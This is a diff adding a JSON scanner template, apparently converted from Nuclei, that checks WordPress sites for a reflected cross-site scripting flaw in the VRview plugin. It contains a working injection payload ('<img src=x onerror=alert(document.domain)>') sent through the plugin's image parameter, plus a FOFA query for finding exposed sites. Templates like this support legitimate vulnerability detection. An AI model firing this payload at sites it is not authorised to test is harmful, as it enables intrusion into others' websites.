@@ -1,0 +1,226 @@
+{
+  "id": "vrview-xss",
+  "name": "VRview Plugin - Cross-Site Scripting",
+  "author": "ritikchaddha",
+  "severity": "HIGH",
+  "description": "The VRview plugin is a tool commonly used to embed and display 360-degree virtual reality content in web applications. However, improper input sanitization in the plugin allows attackers to inject malicious scripts into trusted websites. This vulnerability, classified as Cross-Site Scripting (XSS), could enable attackers to perform unauthorized actions or steal sensitive user data.\n",
+  "references": [
+    "https://blog.mindedsecurity.com/2018/04/dom-based-cross-site-scripting-in.html"
+  ],
+  "tags": [
+    "wp",
+    "wp-plugin",
+    "wordpress",
+    "vrview",
+    "xss"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "http(1) \u0026\u0026 http(2)",
+  "searchQueries": {
+    "fofa": "body\u003d\"/wp-content/plugins/vrview/\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET / HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "/wp-content/plugins/vrview"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /wp-content/plugins/vrview/vrview/?image\u003d\u003cimg%20src\u003dx%20onerror\u003dalert(document.domain)\u003e HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\u003cimg src\u003dx onerror\u003dalert(document.domain)\u003e"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "content_type",
+          "values": [
+            "text/html"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "vrview-xss",
+    "info": {
+      "name": "VRview Plugin - Cross-Site Scripting",
+      "author": "ritikchaddha",
+      "severity": "high",
+      "description": "The VRview plugin is a tool commonly used to embed and display 360-degree virtual reality content in web applications. However, improper input sanitization in the plugin allows attackers to inject malicious scripts into trusted websites. This vulnerability, classified as Cross-Site Scripting (XSS), could enable attackers to perform unauthorized actions or steal sensitive user data.\n",
+      "reference": [
+        "https://blog.mindedsecurity.com/2018/04/dom-based-cross-site-scripting-in.html"
+      ],
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "body\u003d\"/wp-content/plugins/vrview/\""
+      },
+      "tags": "wp,wp-plugin,wordpress,vrview,xss"
+    },
+    "flow": "http(1) \u0026\u0026 http(2)",
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET / HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "/wp-content/plugins/vrview"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /wp-content/plugins/vrview/vrview/?image\u003d\u003cimg%20src\u003dx%20onerror\u003dalert(document.domain)\u003e HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\u003cimg src\u003dx onerror\u003dalert(document.domain)\u003e"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "content_type",
+            "words": [
+              "text/html"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
